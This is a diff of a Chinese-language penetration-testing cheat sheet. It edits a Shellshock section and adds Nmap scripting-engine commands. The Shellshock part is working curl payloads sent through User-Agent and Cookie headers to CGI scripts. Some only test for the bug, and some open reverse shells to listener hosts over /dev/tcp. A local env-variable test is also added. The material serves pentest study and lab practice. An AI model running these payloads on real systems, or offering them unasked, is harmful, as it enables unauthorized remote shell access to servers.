@@ -44,6 +44,7 @@ p.waitFor()
 
 ### 攻擊技巧
 + [CGI-bin exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
+
 ```
 # Reflected
 curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
@@ -54,7 +55,35 @@ curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bi
 # Out-Of-Band Use Cookie as alternative to User-Agent
 curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
 
-#Reverse shell using curl
+# Reverse shell using curl 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
+```
+
++ [Nmap Scripting Engine (NSE)](https://nmap.org/book/nse.html)
 
 ```
+#列出可用腳本
+locate nse
+
+#使用默認腳本集的簡單腳本掃描。
+nmap -sC example.com
+
+#沒有端口掃描的腳本掃描；只有主機腳本才有資格運行。
+nmap -sn -sC example.com
+
+#沒有主機發現或端口掃描的腳本掃描。假定所有主機都已啟動，並且只有主機腳本才有資格運行。
+nmap -Pn -sn -sC example.com
+
+#使用腳本跟踪執行特定腳本
+nmap --script smb-os-discovery --script-trace example.com
+
+#運行帶有腳本參數的單個腳本。
+nmap --script snmp-sysdescr --script-args creds.snmp=admin example.com
+
+#執行 mycustomscripts目錄中的所有腳本以及safe類別中的所有腳本。
+nmap --script mycustomscripts,safe example.com
+
+```
+
++ ShellShock 
+>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
